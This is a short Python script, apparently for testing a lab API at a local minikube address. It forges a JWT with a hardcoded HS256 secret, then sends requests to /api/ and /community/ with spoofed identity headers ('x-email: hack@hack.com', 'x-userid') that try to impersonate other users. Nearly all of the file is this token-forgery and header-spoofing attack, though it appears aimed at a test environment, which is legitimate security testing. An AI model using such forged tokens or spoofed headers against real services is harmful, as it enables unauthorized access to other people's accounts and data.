#!/usr/bin/env python3
import base64
import requests
import jwt
from rich import print as rp

host = 'http://192.168.49.2:30080'
key = base64.b64decode('ueoU/gXIa3tvtRI2a71lSfO5nU1+/4p2')


data = {
  "firstName": "hello",
  "lastName": "world",
  "emailAddress": "helloworlddd@example.com",
  "roles": [
    "this",
    "that",
    "theother"
  ],
  "iss": "issuer",
  "personId": "75bb3cc7-b933-44f0-93c6-147b082fadb5",
  "exp": 1908835200,
  "iat": 1488819600,
  "username": "hello.world"
}

try:
    import sys
    x = sys.argv[1]
except:
    x = jwt.encode(data, key, algorithm='HS256')

c = requests.get(f'{host}/api/', headers={'Authorization': f'Bearer {x}'})
rp(c.text)
rp(c.headers)

c = requests.get(f'{host}/api/', headers={'Authorization': f'Bearer {x}', 'x-email': 'hack@hack.com', 'x-userid': '13371337' })
rp(c.text)
rp(c.headers)

print('-------------')
c = requests.get(f'{host}/community/', headers={'Authorization': f'Bearer {x}', 'x-email': 'hack@hack.com', 'x-userid': '13371337' })
rp(c.text)
rp(c.headers)
